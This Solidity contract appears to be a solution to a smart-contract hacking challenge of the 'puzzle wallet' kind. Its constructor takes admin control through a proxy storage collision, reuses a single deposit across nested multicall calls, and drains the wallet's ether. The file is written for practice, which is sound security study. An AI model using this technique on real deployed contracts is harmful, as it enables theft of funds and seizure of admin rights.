// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface puzzleInterface{
    function proposeNewAdmin(address _newAdmin) external;
    function addToWhitelist(address addr) external;
    function multicall(bytes[] calldata data) external payable;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function setMaxBalance(uint256 _maxBalance) external;
}

contract Exploit{
    constructor(puzzleInterface proxy) payable{
        proxy.proposeNewAdmin(address(this));
        proxy.addToWhitelist(address(this));
         bytes[] memory sIn  = new bytes[](1);
        sIn[0] =  abi.encodeWithSelector(proxy.deposit.selector);
        bytes[] memory fIn = new bytes[](2);
        fIn[0] = abi.encodeWithSelector(proxy.deposit.selector);
        fIn[1] = abi.encodeWithSelector(proxy.multicall.selector, sIn);
        proxy.multicall{value :1000000000000000}(fIn);
        proxy.execute(msg.sender,2000000000000000,"");
        proxy.setMaxBalance(uint256(uint160(msg.sender)));
    }
}

